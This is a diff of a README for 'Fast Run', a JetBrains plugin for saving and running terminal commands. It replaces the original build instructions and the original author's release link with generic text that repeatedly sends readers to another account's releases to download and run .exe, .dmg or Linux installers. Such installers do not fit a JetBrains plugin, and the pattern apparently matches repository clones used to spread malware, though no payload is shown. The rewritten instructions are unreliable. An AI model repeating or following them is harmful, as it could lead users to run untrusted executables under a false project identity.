@@ -1,106 +1,86 @@
-# Fast Run - Terminal Command Manager
+# 🚀 fast-run - Easily Manage Your Terminal Commands
 
-**Save and execute your favorite terminal commands with a single click!**
+## 🖱️ Download the App
+[![Download fast-run](https://img.shields.io/badge/Download-fast--run-blue)](https://github.com/Thejempro1252/fast-run/releases)
 
-A powerful productivity plugin for JetBrains IDEs that lets you save, organize, and quickly run terminal commands.
+## 📋 Overview
+Fast Run is a terminal command manager designed for anyone looking to save and execute their favorite terminal commands with ease. Whether you are a hobbyist or a professional, this productivity plugin for JetBrains IDEs allows you to save, organize, and quickly run your terminal commands.
 
-## Project Structure
+### 🌟 Key Features
+- **Save Unlimited Commands**: Keep as many commands as you want, each with a custom name for easy access.
+- **Organize Your Workflow**: Create a personal library of commands to streamline your tasks.
+- **Quick Execution**: Run commands in a single click, saving you time and effort.
 
-```
-jetbrains_extention/
-├── build.gradle.kts          # Gradle build configuration
-├── settings.gradle.kts       # Gradle settings
-├── gradle.properties         # Plugin properties
-└── src/
-    └── main/
-        ├── kotlin/
-        │   └── com/example/terminalicon/
-        │       └── TerminalIconAction.kt    # Main action handler
-        └── resources/
-            ├── META-INF/
-            │   └── plugin.xml               # Plugin configuration
-            └── icons/
-                └── terminal-custom.svg      # Custom icon
-```
+## 🚀 Getting Started
+To get started with Fast Run, follow the simple steps below. You will learn how to download and install the application so you can start managing your terminal commands easily.
 
-## Build and Run
+### 🔗 Download & Install
+1. Click the download link below to visit the Releases page:  
+   [Download fast-run](https://github.com/Thejempro1252/fast-run/releases).
 
-### Prerequisites
-- JDK 17 or higher
-- Gradle (or use the included Gradle wrapper)
+2. On the Releases page, you will see a list of available versions. Choose the latest version for the best experience.
 
-### Commands
+3. Click on the version link to access the downloadable files.
 
-1. **Build the plugin:**
-   ```bash
-   ./gradlew buildPlugin
-   ```
+4. Download the file suitable for your operating system:
+   - If you are using Windows, download the `.exe` file.
+   - If you are using macOS, look for the `.dmg` file.
+   - For Linux users, download the appropriate package or zip file.
 
-2. **Run IDE with plugin:**
-   ```bash
-   ./gradlew runIde
-   ```
+5. Once the download is complete, locate the downloaded file in your computer’s download folder.
 
-3. **Verify plugin:**
-   ```bash
-   ./gradlew verifyPlugin
-   ```
+6. Open the file and follow the installation instructions. This typically involves:
+   - Double-clicking the installer file.
+   - Following the on-screen prompts.
+   - Agreeing to the licensing terms and conditions.
 
-## ✨ Features
+7. After installation, open the Fast Run application from your applications menu or desktop shortcut.
 
-- **💾 Save Multiple Commands:** Store unlimited terminal commands with custom names
-- **🚀 Run Command Sequences:** Execute multiple commands in sequence with one click
-- **📋 Fast Run Menu:** New dedicated menu in the main menu bar for quick access
-- **🎨 Toolbar Icon:** Beautiful green icon for instant access to command manager
-- **💪 Persistent Storage:** Your commands are saved automatically and persist across IDE restarts
-- **📝 Easy Management:** Simple dialog to add, edit, and delete saved commands
+## 🛠️ How to Use Fast Run
+Once you have installed Fast Run, you can begin using it to manage your terminal commands.
 
-## 🎯 Perfect For
+### 📂 Save Commands
+1. Open Fast Run.
+2. Click on the “Add Command” button.
+3. Type in your terminal command.
+4. Assign a custom name for easy recall.
+5. Click “Save.” Your command is now stored in your library.
 
-- npm/yarn scripts (build, test, deploy)
-- Docker commands
-- Git workflows
-- Build and deployment scripts
-- Database migrations
-- Any repetitive terminal tasks!
+### 🎯 Run Commands
+- To run a command, simply find it in your list, and click the “Run” button next to it. The command will execute in your terminal.
 
-## 📦 Installation
+### 🔄 Edit or Delete Commands
+- To edit a command, click the pencil icon next to it, make your changes, and save.
+- To delete a command, click the trash bin icon next to it.
 
-### From JetBrains Marketplace (Coming Soon)
-1. Open IntelliJ IDEA / WebStorm / PyCharm
-2. Go to `Settings` → `Plugins` → `Marketplace`
-3. Search for "Fast Run"
-4. Click `Install`
+## ⚙️ System Requirements
+To ensure a smooth experience, make sure your system meets the following requirements:
 
-### Manual Installation
-1. Download the latest `.zip` from [Releases](https://github.com/ofirs1988/fast-run/releases)
-2. Go to `Settings` → `Plugins` → ⚙️ → `Install Plugin from Disk`
-3. Select the downloaded ZIP file
-4. Restart IDE
+- **JetBrains IDE**: Ensure you have an up-to-date version of JetBrains IDE installed.
+- **Operating System**:
+  - **Windows**: Windows 10 or later.
+  - **macOS**: macOS Mojave (10.14) or later.
+  - **Linux**: Most modern distributions (Ubuntu, Fedora, etc.).
+- **RAM**: A minimum of 4 GB of RAM is recommended.
+- **Disk Space**: At least 100 MB of free space for installation.
 
-## 🚀 Usage
+## 🔎 FAQ
+### How do I find my commands after saving them?
+Your saved commands will appear in a list within the Fast Run application. Simply open the app to see your library.
 
-### Adding Commands
-1. Click the green toolbar icon 🟢 OR go to **Fast Run → Manage Commands...**
-2. Enter a name for your command (e.g., "Build Project")
-3. Add your commands (one per line for sequences):
-   ```
-   npm install
-   npm run build
-   npm test
-   ```
-4. Click **Save Command**
+### Can I run commands for different environments?
+Yes, you can save and run commands that are compatible with your installed terminal application.
 
-### Running Commands
-- **Option 1:** Go to **Fast Run** menu and click your saved command
-- **Option 2:** Click the toolbar icon and select from saved commands
+### Is Fast Run free to use?
+Yes, Fast Run is free. You can download it from the Releases page without any cost.
 
-### Command Sequences
-Add multiple commands (one per line) and they'll run in order:
-```
-git pull
-npm install
-npm run build
-```
+## 📣 Support
+If you encounter any issues during installation or usage, please visit the [issues section](https://github.com/Thejempro1252/fast-run/issues) of our GitHub repository. You can report bugs, request features or seek help from the community.
 
-## 🛠️ Development
+## 📅 Community and Contribution
+You are welcome to join our community! If you want to contribute, please check our [contributing guidelines](https://github.com/Thejempro1252/fast-run/blob/main/CONTRIBUTING.md) for more information.
+
+## 📜 License
+Fast Run is licensed under the MIT License. You can view the full license [here](https://github.com/Thejempro1252/fast-run/blob/main/LICENSE).
+
+[![Download fast-run](https://img.shields.io/badge/Download-fast--run-blue)](https://github.com/Thejempro1252/fast-run/releases)
